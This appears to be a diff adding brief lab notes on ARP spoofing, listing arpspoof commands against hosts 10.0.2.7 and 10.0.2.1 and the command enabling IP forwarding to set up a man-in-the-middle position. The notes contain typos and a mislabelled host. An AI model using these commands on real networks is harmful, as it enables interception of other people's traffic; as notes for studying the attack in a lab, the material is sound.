@@ -1,0 +1,12 @@
+#arpsoof -i eth0 -t 10.0.2.7 10.0.2.1
+#arpsoof -i eth0 -t 10.0.2.1 10.0.2.7
+
+7 --> target
+1 --> client
+
+we tell client that we are the router
+we tell router we are the client
+
+But now the machine wont transfer packets c, for that we nned to allow port formearding
+
+#echo 1 > proc/sys/net/ipv4/ip_forward
